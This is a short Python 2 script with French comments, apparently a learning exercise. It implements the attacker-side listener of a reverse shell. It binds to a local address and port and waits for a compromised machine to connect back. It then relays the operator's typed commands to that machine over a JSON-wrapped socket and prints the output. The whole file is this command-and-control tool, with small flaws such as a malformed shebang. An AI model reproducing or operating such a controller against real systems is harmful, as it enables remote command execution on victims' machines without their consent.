#!usr/bin/python

import socket
import json

localIP = "192.168.1.27"
portbind = 53421

def reliable_send(data): #pour envoyer plus de 1024 bits
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	data = "" #empty
	while True:
		try:
			data = data + target.recv(1024)
			return json.loads(data) #une fois que c bon y a tout dans data
		except ValueError:
			continue #si on recoit plus de 1024 on continue

def shell():
	while True:
		command = raw_input("* Shell#~%s: " %str(ip))
		reliable_send(command)
		if command == 'q':
			break
		else:
			result = reliable_recv()
			print(result)

def server():
	global s
	global ip
	global target
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #ipv4 connection ; TCP connection
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #options pour le sokcet object

	s.bind((localIP,portbind)) #ca va bind notre ip addresse locale vers le port specifie entre (), veririfer que le port n'est pas utilise
	s.listen(5) #listen for incomming connexions, entre () le nombre

	print("[+] Listening for incoming connections")

	target, ip = s.accept() #on stocke la connexion, socket obj in target, ip stocke ip et port
	print("[+] Connection established from: %s" % str(ip))

server()
shell()
s.close()
